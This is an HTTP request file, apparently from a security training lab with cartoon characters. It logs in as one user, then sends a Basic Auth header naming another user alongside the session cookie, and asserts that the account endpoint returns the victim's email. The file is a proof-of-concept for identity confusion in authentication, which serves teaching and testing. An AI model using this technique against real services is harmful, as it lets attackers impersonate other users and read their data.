# @import ../common/setup.http
@base = {{base_host}}/v201

### Step 1: Plankton logs in to the new website
# @name login
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

### Exploit: Identity Crisis
# Plankton sends his valid Session Cookie (automatically attached) AND a Basic Auth header for SpongeBob.
# The system sees the Cookie and says "Authenticated!".
# But the Basic Auth header poisons the user context with SpongeBob's email.
# @name exploit
GET {{base}}/account/info
Authorization: Basic spongebob@bikinibottom.sea:wrong_password

# Verification: We are authenticated (200) but the email belongs to SpongeBob.
?? status == 200
?? body.email == "spongebob@bikinibottom.sea"
